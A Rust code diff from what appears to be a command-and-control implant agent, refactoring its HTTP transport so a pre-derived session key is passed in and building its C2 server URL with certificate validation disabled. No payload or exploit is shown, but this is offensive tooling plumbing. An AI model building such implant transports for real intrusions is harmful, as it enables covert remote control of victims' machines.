@@ -9,32 +9,22 @@ use ghoststrike_common::{
 use crate::config::AgentConfig;
 
 pub struct HttpTransport {
-    client:   Client,
-    base_url: String,
+    client:      Client,
+    base_url:    String,
     session_key: Option<SessionKey>,
 }
 
 impl HttpTransport {
-    pub fn new(cfg: &AgentConfig) -> Result<Self> {
+    /// Create HTTP transport with an already-derived session key (may be None).
+    pub fn new(cfg: &AgentConfig, session_key: Option<SessionKey>) -> Result<Self> {
         let scheme = match cfg.protocol {
             ListenerProtocol::Https => "https",
             _                       => "http",
         };
         let base_url = format!("{}://{}:{}", scheme, cfg.c2_host, cfg.c2_port);
-
-        let session_key = if cfg.c2_key.is_empty() {
-            None
-        } else {
-            let raw = hex::decode(&cfg.c2_key)
-                .map_err(|_| anyhow::anyhow!("invalid c2_key hex"))?;
-            Some(SessionKey::from_bytes(&raw)
-                .map_err(|e| anyhow::anyhow!("{e}"))?)
-        };
-
         let client = Client::builder()
             .danger_accept_invalid_certs(true)
             .build()?;
-
         Ok(Self { client, base_url, session_key })
     }
 
